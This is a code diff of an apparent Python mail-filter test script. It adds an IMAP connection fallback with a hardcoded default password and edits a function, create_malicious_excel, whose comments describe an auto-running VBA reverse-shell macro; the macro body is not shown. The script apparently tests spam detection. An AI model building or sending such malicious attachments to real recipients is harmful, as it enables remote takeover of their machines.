@@ -681,19 +681,41 @@ def check_email_spam_after_send(target_email, subject, message_id=None, wait_sec
         "x_spamd_bar": None,
     }
     
-    # Ждем обработки rspamd
+    # Ждем обработки rspamd и готовности IMAP сервера
+    print(f"   ⏳ Ожидание {wait_seconds} сек для обработки rspamd и готовности IMAP...")
     time.sleep(wait_seconds)
     
     try:
         # Параметры IMAP
-        imap_server = os.getenv('IMAP_SERVER', 'front')
+        # В Docker сети подключаемся напрямую к сервису imap (dovecot)
+        imap_server = os.getenv('IMAP_SERVER', 'imap')
         imap_port = int(os.getenv('IMAP_PORT', '143'))
-        imap_user = target_email
+        imap_user = target_email  # Полный email как логин
         imap_password = os.getenv('IMAP_PASSWORD', '1q2w#E$R')
         
         # Подключаемся к IMAP
         print(f"   🔍 Подключение к IMAP {imap_server}:{imap_port}...")
-        mail = imaplib.IMAP4(imap_server, imap_port)
+        mail = None
+        last_error = None
+        
+        # Пробуем подключиться к imap (dovecot) напрямую
+        try:
+            mail = imaplib.IMAP4(imap_server, imap_port)
+            print(f"   ✅ Подключено к {imap_server}:{imap_port}")
+        except Exception as e:
+            last_error = e
+            print(f"   ⚠️  Не удалось подключиться к {imap_server}:{imap_port}: {e}")
+            # Пробуем через front (nginx proxy)
+            try:
+                print(f"   🔄 Пробую через front:143...")
+                mail = imaplib.IMAP4('front', 143)
+                print(f"   ✅ Подключено через front:143")
+            except Exception as e2:
+                last_error = e2
+                print(f"   ⚠️  Не удалось подключиться через front: {e2}")
+                raise last_error
+        
+        # Логинимся
         mail.login(imap_user, imap_password)
         
         # Выбираем INBOX
@@ -1923,7 +1945,7 @@ def create_malicious_excel():
     # Добавляем минимальные данные Excel
     xls_data += b"""PK\x03\x04\x14\x00\x06\x00\x08\x00\x00\x00!\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"""
     
-    # VBA код для reverse shell
+    # VBA код для reverse shellQ
     vba_code = """
 Sub Auto_Open()
     ' Вредоносный VBA код для reverse shell
